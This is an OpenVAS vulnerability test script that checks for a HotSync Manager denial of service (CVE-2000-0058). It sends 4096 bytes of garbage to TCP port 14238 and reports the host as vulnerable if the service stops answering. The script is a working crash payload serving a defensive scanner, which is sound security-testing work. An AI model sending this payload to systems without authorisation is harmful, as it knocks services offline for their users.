# OpenVAS Vulnerability Test
# $Id: hotsync.nasl 17 2013-10-27 14:01:43Z jan $
# Description: HotSync Manager Denial of Service attack
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
#
# Copyright:
# Copyright (C) 1999 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to cause HotSync Manager to crash by 
sending a few bytes
of garbage into its listening port TCP 14238.";

tag_solution = "Block those ports from outside communication";

if(description)
{
 script_id(10102);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(920);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2000-0058");
 name = "HotSync Manager Denial of Service attack";
 script_name(name);
 
desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "HotSync Manager Denial of Service attack";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 1999 SecuriTeam");
 family = "Denial of Service";
 script_family(family);
 script_require_ports(14238);
 
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

if (get_port_state(14238))
{
 sock14238 = open_sock_tcp(14238);
 if (sock14238)
 {
  data_raw = crap(4096) + string("\n");
  send(socket:sock14238, data:data_raw);
  close(sock14238);

  sleep(5);

  sock14238_sec = open_sock_tcp(14238);
  if (sock14238_sec)
  {
   security_warning(port:14238, data:"HotSync Manager port is open.");
  }
  else
  {
   security_hole(port:14238);
  }
 }
}
